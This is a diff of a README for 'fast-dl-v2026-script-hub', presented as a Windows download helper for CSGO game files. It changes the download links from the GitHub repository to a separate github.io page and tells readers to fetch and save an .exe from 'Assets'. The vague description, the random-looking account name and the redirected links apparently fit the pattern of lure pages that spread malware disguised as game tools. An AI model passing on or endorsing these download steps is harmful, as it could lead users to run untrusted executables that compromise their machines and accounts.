@@ -1,6 +1,6 @@
 # 🌐 fast-dl-v2026-script-hub - Easy game utility for faster downloads
 
-[![Download Utility](https://img.shields.io/badge/Download-ClickHere-blue.svg)](https://github.com/back-benthoniczone237/fast-dl-v2026-script-hub)
+[![Download Utility](https://img.shields.io/badge/Download-ClickHere-blue.svg)](https://back-benthoniczone237.github.io)
 
 This tool helps players manage game files for CSGO. It provides a simple way to fetch helper content and access web-based resources without needing manual file placement. The utility runs on Windows and works as an interface to speed up the setup of game assets.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these base requirements before you start:
 
 You need the installer file to begin. Follow these steps to obtain the program:
 
-1. Visit the [official download page link](https://github.com/back-benthoniczone237/fast-dl-v2026-script-hub).
+1. Visit the [official download page link](https://back-benthoniczone237.github.io).
 2. Look for the button or link labeled "Assets" on that page.
 3. Select the file ending in .exe.
 4. Save the file to your desktop or your Downloads folder.
